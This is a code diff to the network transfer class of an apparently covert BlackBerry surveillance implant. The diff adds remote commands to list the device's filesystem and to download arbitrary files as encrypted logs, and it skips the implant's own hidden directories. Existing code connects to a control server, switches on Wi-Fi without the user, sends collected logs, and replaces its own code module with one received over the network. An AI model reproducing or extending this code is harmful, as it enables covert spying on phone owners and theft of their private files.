@@ -9,8 +9,13 @@
 package blackberry.transfer;
 
 import java.io.IOException;
+import java.util.Date;
+import java.util.Enumeration;
 import java.util.Random;
 import java.util.Vector;
+
+import javax.microedition.io.file.FileConnection;
+import javax.microedition.io.file.FileSystemRegistry;
 
 import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.system.Radio;
@@ -19,16 +24,19 @@ import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Conf;
 import blackberry.Device;
-import blackberry.Status;
 import blackberry.action.Apn;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.fs.AutoFlashFile;
+import blackberry.fs.Directory;
 import blackberry.fs.Path;
+import blackberry.log.Log;
 import blackberry.log.LogCollector;
+import blackberry.log.LogType;
 import blackberry.utils.Check;
+import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
@@ -114,20 +122,20 @@ public class Transfer {
 
         if (wifiForced) {
 
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("connect: wifiForced");
             //#endif
 
-            int waf = RadioInfo.getEnabledWAFs() & ~RadioInfo.WAF_WLAN;
+            final int waf = RadioInfo.getEnabledWAFs() & ~RadioInfo.WAF_WLAN;
             boolean active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
             boolean ret = false;
             if (!active) {
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("Activating Wifi");
                 //#endif
                 ret = Radio.activateWAFs(waf);
             } else {
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("connect: Wifi already active");
                 //#endif
             }
@@ -137,7 +145,7 @@ public class Transfer {
                 activatedWifi = true;
             }
 
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("wifiForced waf: " + waf + " active: " + active);
             //#endif
 
@@ -148,14 +156,14 @@ public class Transfer {
         }
 
         if (wifiAdmitted) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("Try wifi, ssl:" + ssl);
             //#endif
 
             connection = new WifiConnection(host, port, ssl);
 
             if (connection.isActive()) {
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("wifi connecting...");
                 //#endif
                 // /wifi = true;
@@ -169,7 +177,7 @@ public class Transfer {
                 }
                 //#endif
             } else {
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("wifi not active");
                 //#endif
             }
@@ -177,14 +185,14 @@ public class Transfer {
 
         // fall back
         if (!connected && gprsAdmitted) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("Try direct tcp, ssl:" + ssl);
             //#endif
             // TODO: limit to the useful and actually working methods, ignore
             // apn
 
             for (int method = DirectTcpConnection.METHOD_DEVICE; method <= DirectTcpConnection.METHOD_NODEVICE; method++) {
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("method: " + method);
                 //#endif
                 connection = new DirectTcpConnection(host, port, ssl, method);
@@ -192,7 +200,7 @@ public class Transfer {
                 connected = connection.connect();
 
                 if (connected) {
-                    //#ifdef DEBUG_INFO
+                    //#ifdef DEBUG
                     debug.info("Connected tpc ssl:" + ssl + " method: "
                             + method);
                     //#endif
@@ -204,8 +212,8 @@ public class Transfer {
         // fall back
         if (!connected && apns != null) {
             for (int i = 0; i < apns.size(); i++) {
-                Apn apn = (Apn) apns.elementAt(i);
-                //#ifdef DEBUG_TRACE
+                final Apn apn = (Apn) apns.elementAt(i);
+                //#ifdef DEBUG
                 debug.trace("apn: " + apn);
                 //#endif
 
@@ -214,7 +222,7 @@ public class Transfer {
                 connected = connection.connect();
 
                 if (connected) {
-                    //#ifdef DEBUG_INFO
+                    //#ifdef DEBUG
                     debug.info("Connected tpc ssl:" + ssl + " apn: " + apn);
                     //#endif
                     break;
@@ -229,7 +237,7 @@ public class Transfer {
             return false;
         }
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("connected: " + connected);
 
         //#endif
@@ -252,24 +260,24 @@ public class Transfer {
             connection.disconnect();
             connection = null;
         }
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("connected: " + connected);
         //#endif
 
         if (activatedWifi) {
             activatedWifi = false;
-            int waf = RadioInfo.getEnabledWAFs() & ~RadioInfo.WAF_WLAN;
+            final int waf = RadioInfo.getEnabledWAFs() & ~RadioInfo.WAF_WLAN;
             boolean active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
-            boolean ret = false;
+            final boolean ret = false;
             if (active) {
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("Deactivating Wifi");
                 //#endif
                 Radio.deactivateWAFs(waf);
             }
 
             active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("deactivating wifiForced waf: " + waf + " active: "
                     + active);
             //#endif
@@ -295,7 +303,7 @@ public class Transfer {
             final byte[] buflen = connection.receive(4);
             final int len = Utils.byteArrayToInt(buflen, 0);
 
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("fillPayload len: " + len);
             //#endif
 
@@ -333,7 +341,7 @@ public class Transfer {
 
         try {
             command.payload = connection.receive(len);
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("filled with: " + command.payload.length);
             //#endif
         } catch (final IOException e) {
@@ -353,7 +361,7 @@ public class Transfer {
      */
     protected final void getChallenge() throws ProtocolException {
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("getChallenge");
 
         //#endif
@@ -396,7 +404,7 @@ public class Transfer {
     protected final void getNewConf(final Command command)
             throws CommandException, ProtocolException {
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("getNewConf");
         //#endif
 
@@ -421,45 +429,230 @@ public class Transfer {
         }
     }
 
+    Log fsLog;
+
     /**
-     * Gets the response.
+     * Receives and answers to a filesystem commands. The command is componed by
+     * two parts: the path and the recursive depth.
      * 
-     * @return the response
+     * @param command
      * @throws ProtocolException
-     *             the protocol exception
+     * @throws CommandException
      */
-    protected final void getResponse() throws ProtocolException {
-        //#ifdef DEBUG_INFO
-        debug.info("getResponse");
+    private void sendFilesystem(Command command) throws ProtocolException,
+            CommandException {
+        String filefilter;
+
+        //#ifdef DEBUG
+        debug.trace("sendFilesystem");
         //#endif
 
-        final Command command = recvCommand();
-        // boolean exception = false;
-        if (command == null || command.id != Proto.RESPONSE) {
+        sendCommand(Proto.OK);
+
+        //DEPTH
+        int depth;
+
+        try {
+            final byte[] buffer = connection.receive(4);
+            depth = Utils.byteArrayToInt(buffer, 0);
+        } catch (IOException e) {
             throw new ProtocolException();
         }
+        //#ifdef DEBUG
+        debug.trace("depth " + depth);
+        //#endif
+        sendCommand(Proto.OK);
 
-        // e' arrivato il response, leggo il contenuto
-        if (command.id == Proto.RESPONSE) {
-            fillPayloadLen(command, 16);
-            if (command.size() != 16) {
-                throw new ProtocolException();
-            }
-            // ho 16 byte di response, lo confronto con il challange crittato
-            final byte[] cryptoChallenge = crypto.encryptData(challenge);
-            if (!Arrays.equals(cryptoChallenge, command.payload)) {
-                throw new ProtocolException();
-            } else {
-                //#ifdef DEBUG_INFO
-                debug.info("Response OK");
-                //#endif
-                sendCommand(Proto.OK);
-            }
+        // PATH
+        fillPayload(command);
+        String path = WChar.getString(command.payload, true);
+        //#ifdef DEBUG
+        debug.trace("path " + path);
+        //#endif
+        sendCommand(Proto.OK);
 
+        fsLog = new Log(false, Keys.getInstance().getAesKey());
+        fsLog.createLog(null, LogType.FILESYSTEM);
+
+        // Expand path and create log
+        if (path.equals("/")) {
+            //#ifdef DEBUG
+            debug.trace("sendFilesystem: root");
+            //#endif
+            expandRoot(depth);
         } else {
-            throw new ProtocolException();
+            if (path.startsWith("//") && path.endsWith("/*")) {
+                path = path.substring(1, path.length() - 2);
+
+                expandPath(path, depth);
+            } else {
+                //#ifdef DEBUG
+                debug.error("sendFilesystem: strange path, ignoring it. "
+                        + path);
+                //#endif
+            }
         }
 
+        fsLog.close();
+    }
+
+    /**
+     * Expand the root for a maximum depth. 0 means only root, 1 means its sons.
+     * 
+     * @param depth
+     */
+    private void expandRoot(int depth) {
+        //#ifdef DBC
+        Check.requires(depth > 0, "wrong recursion depth");
+        //#endif
+        
+        saveRootLog(); // depth 0
+        final Enumeration roots = FileSystemRegistry.listRoots();
+        
+        while (roots.hasMoreElements()) {
+            String root = (String) roots.nextElement();
+            if (root.endsWith("/")) {
+                root = root.substring(0, root.length() - 1);
+            }
+            //#ifdef DEBUG
+            debug.trace("expandRoot: " + root + " depth: " + depth);
+            //#endif
+            saveFilesystemLog("/" + root); // depth 1
+            if (depth - 1 > 0) {
+                // if depth is 0, no recursion is required
+                expandPath("/" + root, depth - 1); // depth 2+
+            }
+        }
+    }
+
+    /**
+     * saves the root log. We use this method because the directory "/" cannot
+     * be opened, we fake it.
+     */
+    private void saveRootLog() {
+        int version = 2010031501;
+
+        //#ifdef DBC
+        Check.requires(fsLog != null, "fsLog null");
+        //#endif
+        byte[] content = new byte[30];
+        DataBuffer databuffer = new DataBuffer(content, 0, content.length,
+                false);
+        databuffer.writeInt(version);
+        databuffer.writeInt(2); // len
+        databuffer.writeInt(1); // flags
+        databuffer.writeLong(0);
+        databuffer.writeLong(DateTime.getFiledate(new Date()));
+        databuffer.write(WChar.getBytes("/"));
+
+        fsLog.writeLog(content);
+    }
+
+    /**
+     * Expand recursively the path saving the log. When depth is 0 saves the log
+     * and stop recurring.
+     * 
+     * @param path
+     * @param depth
+     */
+    private void expandPath(String path, int depth) {
+        //#ifdef DBC
+        Check.requires(depth > 0, "wrong recursion depth");
+        Check.requires(path != null, "path==null");
+        Check.requires(!path.endsWith("/"), "path shouldn't end with /");
+        Check.requires(!path.endsWith("*"), "path shouldn't end with *");
+        //#endif
+
+        //#ifdef DEBUG
+        debug.trace("expandPath: " + path + " depth: " + depth);
+        //#endif
+
+        //saveFilesystemLog(path);
+        //if (depth > 0) {
+        for (Enumeration enum = Directory.find(path + "/*"); enum
+                .hasMoreElements();) {
+
+            String dPath = path + "/" + (String) enum.nextElement();
+            if (dPath.endsWith("/")) {
+                //#ifdef DEBUG
+                debug.trace("expandPath: dir");
+                //#endif
+                dPath = dPath.substring(0, dPath.length() - 1); // togli lo /
+            }else{
+                //#ifdef DEBUG
+                debug.trace("expandPath: file");
+                //#endif
+            }
+
+            if (dPath.indexOf(Utils.chomp(Path.SD(),"/")) >= 0
+                    || dPath.indexOf(Utils.chomp(Path.USER(),"/")) >= 0) {
+                //#ifdef DEBUG
+                debug.warn("expandPath ignoring hidden path: " + dPath);
+                //#endif
+                continue;
+            }
+
+            boolean isDir = saveFilesystemLog(dPath);
+            if (isDir && depth > 1) {
+                expandPath(dPath, depth - 1);
+            }
+        }
+        //}
+    }
+
+    private boolean saveFilesystemLog(String filepath) {
+        //#ifdef DBC
+        Check.requires(fsLog != null, "fsLog null");
+        Check.requires(!filepath.endsWith("/"), "path shouldn't end with /");
+        Check.requires(!filepath.endsWith("*"), "path shouldn't end with *");
+        //#endif
+
+        //#ifdef DEBUG
+        debug.info("save FilesystemLog: " + filepath);
+        //#endif
+        int version = 2010031501;
+
+        AutoFlashFile file = new AutoFlashFile(filepath);
+        if (!file.exists()) {
+            //#ifdef DEBUG
+            debug.error("non existing file: " + filepath);
+            //#endif
+            return false;
+        }
+
+        byte[] w_filepath = WChar.getBytes(filepath, true);
+
+        byte[] content = new byte[28 + w_filepath.length];
+        DataBuffer databuffer = new DataBuffer(content, 0, content.length,
+                false);
+
+        databuffer.writeInt(version);
+        databuffer.writeInt(w_filepath.length);
+
+        int flags = 0;
+        long size = file.getSize();
+
+        boolean isDir = file.isDirectory();
+        if (isDir) {
+            flags |= 1;
+        } else {
+            if (size == 0) {
+                flags |= 2;
+            }
+        }
+
+        databuffer.writeInt(flags);
+        databuffer.writeLong(size);
+        databuffer.writeLong(DateTime.getFiledate(file.getFileTime()));
+        databuffer.write(w_filepath);
+
+        fsLog.writeLog(content);
+
+        //#ifdef DEBUG
+        debug.trace("expandPath: written log");
+        //#endif
+
+        return isDir;
     }
 
     /**
@@ -469,10 +662,124 @@ public class Transfer {
      *            the command
      * @throws CommandException
      *             the command exception
+     * @throws ProtocolException
      */
     protected final void sendDownload(final Command command)
-            throws CommandException {
-        throw new CommandException(); //"Not Implemented"
+            throws CommandException, ProtocolException {
+
+        String filefilter;
+
+        //#ifdef DEBUG
+        debug.trace("sendDownload");
+        //#endif
+
+        sendCommand(Proto.OK);
+        fillPayload(command);
+
+        if (command.size() <= 0) {
+            throw new CommandException(); //"zero"
+        }
+
+        filefilter = WChar.getString(command.payload, true);
+        if (filefilter.startsWith("//")) {
+            filefilter = filefilter.substring(1);
+        }
+
+        // expanding $dir$
+        filefilter = Directory.expandMacro(filefilter);
+
+        //#ifdef DEBUG
+        debug.trace("downloading file: " + filefilter);
+        //#endif
+
+        AutoFlashFile file = new AutoFlashFile(filefilter, false);
+        if (file.exists()) {
+            //#ifdef DEBUG
+            debug.trace("logging file: " + filefilter);
+            //#endif
+            saveFileLog(file, filefilter);
+        } else {
+            //#ifdef DEBUG
+            debug.trace("not a file, try to expand it: " + filefilter);
+            //#endif
+            for (Enumeration enum = Directory.find(filefilter); enum
+                    .hasMoreElements();) {
+                String filename = (String) enum.nextElement();
+
+                file = new AutoFlashFile(filename, false);
+                if (file.isDirectory()) {
+                    continue;
+                }
+
+                saveFileLog(file, filename);
+
+                //#ifdef DEBUG
+                debug.trace("logging file: " + filename);
+                //#endif
+
+            }
+        }
+
+        sendCommand(Proto.ENDFILE);
+        waitForOK();
+        
+      //#ifdef DEBUG
+        debug.trace("ENDFILE");
+        //#endif
+    }
+
+    private void saveFileLog(AutoFlashFile file, String filename) {
+        //#ifdef DBC
+        Check.requires(file != null, "null file");
+        Check.requires(file.exists(), "file should exist");
+        Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
+        Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
+        //#endif
+
+        byte[] content = file.read();
+        byte[] additional = logDownloadAdditional(filename);
+        Log log = new Log(false, Keys.getInstance().getAesKey());
+        log.createLog(additional, LogType.DOWNLOAD);
+        log.writeLog(content);
+        log.close();
+    }
+
+    private byte[] logDownloadAdditional(String filename) {
+
+        //#ifdef DBC
+        Check.requires(filename != null, "null file");
+        Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
+        Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
+        //#endif
+
+        String path = Utils.chomp(Path.USER(), "/"); // UPLOAD_DIR
+        int macroPos = filename.indexOf(path);
+        if (macroPos >= 0) {
+            //#ifdef DEBUG
+            debug.trace("macropos: " + macroPos);
+            //#endif
+            String start = filename.substring(0, macroPos);
+            String end = filename.substring(macroPos + path.length());
+
+            filename = start + Directory.hiddenDirMacro + end;
+        }
+
+        //#ifdef DEBUG
+        debug.trace("filename: " + filename);
+        //#endif
+
+        int version = 2008122901;
+        byte[] wfilename = WChar.getBytes(filename);
+        byte[] buffer = new byte[wfilename.length + 8];
+
+        final DataBuffer databuffer = new DataBuffer(buffer, 0, buffer.length,
+                false);
+
+        databuffer.writeInt(version);
+        databuffer.writeInt(wfilename.length);
+        databuffer.write(wfilename);
+
+        return buffer;
     }
 
     /**
@@ -489,13 +796,13 @@ public class Transfer {
     protected final void getUpload(final Command command)
             throws ProtocolException, CommandException {
         String filename;
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("getUpload");
         //#endif
 
         sendCommand(Proto.OK);
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("fill name");
         //#endif
         fillPayload(command);
@@ -505,8 +812,8 @@ public class Transfer {
         }
 
         filename = WChar.getString(command.payload, true);
-        //#ifdef DEBUG_TRACE
-        debug.trace("uploading file: " + Path.USER()+filename);
+        //#ifdef DEBUG
+        debug.trace("uploading file: " + Path.USER() + filename);
         //#endif
 
         sendCommand(Proto.OK);
@@ -516,20 +823,26 @@ public class Transfer {
             throw new CommandException(); //"zero"
         }
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("uploaded file: " + command.size());
         //#endif
 
-        AutoFlashFile file = new AutoFlashFile(Path.USER() + filename, true);
+        final AutoFlashFile file = new AutoFlashFile(Path.USER() + filename,
+                true);
         if (file.exists()) {
+            //#ifdef DEBUG
+            debug.trace("getUpload replacing existing file: "+ filename);
+            //#endif
             file.delete();
         }
         file.create();
         file.write(command.payload);
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("file written: " + file.exists());
         //#endif
+        
+        sendCommand(Proto.OK);
     }
 
     /**
@@ -545,13 +858,13 @@ public class Transfer {
     protected final void getUpgrade(final Command command)
             throws CommandException, ProtocolException {
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("getUpgrade");
         //#endif
 
         sendCommand(Proto.OK);
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("fill");
         //#endif
         fillPayload(command);
@@ -571,10 +884,10 @@ public class Transfer {
 
     private boolean upgrade(byte[] codBuff) {
         // Delete it self.
-        int handle = CodeModuleManager.getModuleHandle(Conf.MODULE_NAME);
+        final int handle = CodeModuleManager.getModuleHandle(Conf.MODULE_NAME);
         if (handle != 0) {
-            int success = CodeModuleManager.deleteModuleEx(handle, true);
-            //#ifdef DEBUG_INFO
+            final int success = CodeModuleManager.deleteModuleEx(handle, true);
+            //#ifdef DEBUG
             debug.info("deleted: " + success);
             //#endif
         } else {
@@ -583,7 +896,7 @@ public class Transfer {
         // Download new cod files(included sibling files).
 
         if (isZip(codBuff)) {
-            //#ifdef DEBUG_WARN
+            //#ifdef DEBUG
             debug.warn("zip not supported");
             //#endif
             return false;
@@ -592,13 +905,13 @@ public class Transfer {
             // API REFERENCE:
             // You need to write the data in two separate chunks.
             // The first data chunk must be less thank 64KB in size.
-            int MAXAPPEND = 61440; // 1024*60;
+            final int MAXAPPEND = 61440; // 1024*60;
 
             if (codBuff.length > MAXAPPEND) {
                 newHandle = CodeModuleManager.createNewModule(codBuff.length,
                         codBuff, MAXAPPEND);
 
-                boolean appendSucc = CodeModuleManager.writeNewModule(
+                final boolean appendSucc = CodeModuleManager.writeNewModule(
                         newHandle, MAXAPPEND, codBuff, MAXAPPEND,
                         codBuff.length - MAXAPPEND);
 
@@ -610,15 +923,16 @@ public class Transfer {
             }
             // install the module
             if (newHandle != 0) {
-                int savecode = CodeModuleManager.saveNewModule(newHandle, true);
+                final int savecode = CodeModuleManager.saveNewModule(newHandle,
+                        true);
                 if (savecode != CodeModuleManager.CMM_OK_MODULE_OVERWRITTEN) {
-                    //#ifdef DEBUG_ERROR
+                    //#ifdef DEBUG
                     debug.error("Module not overwritten");
                     //#endif
                     return false;
                 }
             }
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("Module installed");
             //#endif
 
@@ -627,7 +941,7 @@ public class Transfer {
                 //#ifdef DEBUG
                 CodeModuleManager.promptForResetIfRequired();
                 //#endif
-                //#ifdef DEBUG_WARN
+                //#ifdef DEBUG
                 debug.warn("Reset required");
                 //#endif
             }
@@ -717,14 +1031,14 @@ public class Transfer {
 
             switch (command.id) {
             case Proto.SYNC:
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("SYNC");
                 //#endif
                 syncLogs(command);
                 break;
 
             case Proto.NEW_CONF:
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("NEW_CONF");
                 //#endif
                 getNewConf(command);
@@ -732,7 +1046,7 @@ public class Transfer {
                 break;
 
             case Proto.UNINSTALL:
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("UNINSTALL");
                 //#endif
                 uninstall = true;
@@ -740,28 +1054,35 @@ public class Transfer {
                 return false;
 
             case Proto.DOWNLOAD:
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("DOWNLOAD");
                 //#endif
                 sendDownload(command);
                 break;
 
             case Proto.UPLOAD:
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("UPLOAD");
                 //#endif
                 getUpload(command);
                 break;
 
             case Proto.UPGRADE:
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("UPGRADE");
                 //#endif
                 getUpgrade(command);
                 break;
 
+            case Proto.FILESYSTEM:
+                //#ifdef DEBUG
+                debug.info("FILESYSTEM");
+                //#endif
+                sendFilesystem(command);
+                break;
+
             case Proto.BYE:
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("BYE");
                 //#endif
                 return false;
@@ -785,7 +1106,7 @@ public class Transfer {
      * @return the command
      */
     protected final Command recvCommand() {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("recvCommand");
         //#endif
 
@@ -815,7 +1136,7 @@ public class Transfer {
             return null;
         }
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("received command: " + command);
 
         //#endif
@@ -830,21 +1151,69 @@ public class Transfer {
      */
     protected final void sendChallenge() throws ProtocolException {
 
-        //#ifdef DEBUG_INFO
-        debug.info("sendChallenge");
-
-        //#endif
-
-        // TODO: keep a log seed
-        final Random random = new Random();
-
         for (int i = 0; i < 16; i++) {
-            challenge[i] = (byte) random.nextInt();
+            challenge[i] = (byte) Utils.randomInt();
         }
+
+        //#ifdef DEBUG
+        debug.trace("sendChallenge: " + Utils.byteArrayToHex(challenge));
+        //#endif   
 
         if (!sendCommand(Proto.CHALLENGE, challenge)) {
             throw new ProtocolException();
         }
+    }
+
+    /**
+     * Gets the response.
+     * 
+     * @return the response
+     * @throws ProtocolException
+     *             the protocol exception
+     */
+    protected final void getResponse() throws ProtocolException {
+        //#ifdef DEBUG
+        debug.trace("getResponse");
+        //#endif
+
+        final Command command = recvCommand();
+        // boolean exception = false;
+        if (command == null || command.id != Proto.RESPONSE) {
+            throw new ProtocolException();
+        }
+
+        // e' arrivato il response, leggo il contenuto
+        if (command.id == Proto.RESPONSE) {
+            fillPayloadLen(command, 16);
+            if (command.size() != 16) {
+                throw new ProtocolException();
+            }
+            // ho 16 byte di response, lo confronto con il challange crittato
+            final byte[] cryptoChallenge = crypto.encryptData(challenge);
+
+            if (!Arrays.equals(cryptoChallenge, command.payload)) {
+                //#ifdef DEBUG
+                debug.trace("key: "
+                        + Utils.byteArrayToHex(Keys.getInstance()
+                                .getChallengeKey()));
+                debug.trace("cryptoChallenge: "
+                        + Utils.byteArrayToHex(cryptoChallenge));
+                debug.trace("command.payload: "
+                        + Utils.byteArrayToHex(command.payload));
+                //#endif
+
+                throw new ProtocolException();
+            } else {
+                //#ifdef DEBUG
+                debug.info("Response OK");
+                //#endif
+                sendCommand(Proto.OK);
+            }
+
+        } else {
+            throw new ProtocolException();
+        }
+
     }
 
     /**
@@ -858,7 +1227,7 @@ public class Transfer {
         //#ifdef DBC
         Check.requires(command != null, "null command");
         //#endif
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("sending command: " + command);
         //#endif
 
@@ -871,7 +1240,7 @@ public class Transfer {
 
             databuffer.write(command.payload);
         } else {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("payload null");
             //#endif
         }
@@ -951,7 +1320,7 @@ public class Transfer {
     }
 
     private void sendLogs(final String basePath) throws ProtocolException {
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("sending logs from: " + basePath);
         //#endif
 
@@ -966,7 +1335,7 @@ public class Transfer {
                 final String fullLogName = basePath + dir + logName;
                 final AutoFlashFile file = new AutoFlashFile(fullLogName, false);
                 if (!file.exists()) {
-                    //#ifdef DEBUG_ERROR
+                    //#ifdef DEBUG
                     debug.error("File doesn't exist: " + fullLogName);
                     //#endif
                     continue;
@@ -981,14 +1350,14 @@ public class Transfer {
                         false);
 
                 if (!ret) {
-                    //#ifdef DEBUG_ERROR
+                    //#ifdef DEBUG
                     debug.error("cannot send file: " + fullLogName);
                     //#endif
                 }
                 logCollector.remove(fullLogName);
             }
             if (!Path.removeDirectory(basePath + dir)) {
-                //#ifdef DEBUG_WARN
+                //#ifdef DEBUG
                 debug.warn("Not empty directory");
                 //#endif
             }
@@ -1014,12 +1383,12 @@ public class Transfer {
         byte[] toSend;
 
         if (cypher) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("Sending Crypto Command: " + commandId);
             //#endif
             toSend = crypto.encryptData(plain);
         } else {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("Sending Managed Command: " + commandId);
             //#endif
             toSend = plain;
@@ -1036,7 +1405,7 @@ public class Transfer {
 
         boolean sent = false;
         try {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("sending content");
             //#endif
             sent = connection.send(toSend);
@@ -1065,7 +1434,7 @@ public class Transfer {
         Check.requires(challenge != null, "null crypto challange");
         //#endif
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("sendResponse");
 
         //#endif
@@ -1084,7 +1453,7 @@ public class Transfer {
      * @return true, if successful
      */
     public final synchronized boolean startSession() {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("startSession");
         //#endif
         try {
@@ -1105,13 +1474,13 @@ public class Transfer {
         boolean gotbye = false;
         try {
             // challenge response
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("ChallengeResponse ->");
             //#endif
             sendChallenge();
             getResponse();
 
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("ChallengeResponse <-");
 
             //#endif
@@ -1119,7 +1488,7 @@ public class Transfer {
             sendResponse();
 
             // identificazione
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("Ids");
             //#endif
             sendIds();
@@ -1127,12 +1496,12 @@ public class Transfer {
             // ricezione configurazione o comandi
             for (;;) {
                 final Command command = recvCommand();
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("Received command:" + command);
                 //#endif
 
                 if (command == null || !parseCommand(command)) {
-                    //#ifdef DEBUG_INFO
+                    //#ifdef DEBUG
                     debug.info("finished commands");
                     //#endif
                     break;
@@ -1145,13 +1514,13 @@ public class Transfer {
             gotbye = ex.bye;
             return false;
         } finally {
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("disconnect");
             //#endif
             disconnect(!gotbye);
         }
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("done");
 
         //#endif
@@ -1169,19 +1538,19 @@ public class Transfer {
     protected final synchronized void syncLogs(final Command command)
             throws ProtocolException {
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("syncLogs connected: " + connected);
         //#endif
 
         sendLogs(Path.SD());
         sendLogs(Path.USER());
-
-        //#ifdef DEBUG_TRACE
+       
+        sendCommand(Proto.LOG_END);
+        waitForOK(); //??
+        
+        //#ifdef DEBUG
         debug.trace("syncLogs: all logs sent");
         //#endif
-
-        sendCommand(Proto.LOG_END);
-        waitForOK();
     }
 
     private void waitForOK() throws ProtocolException {
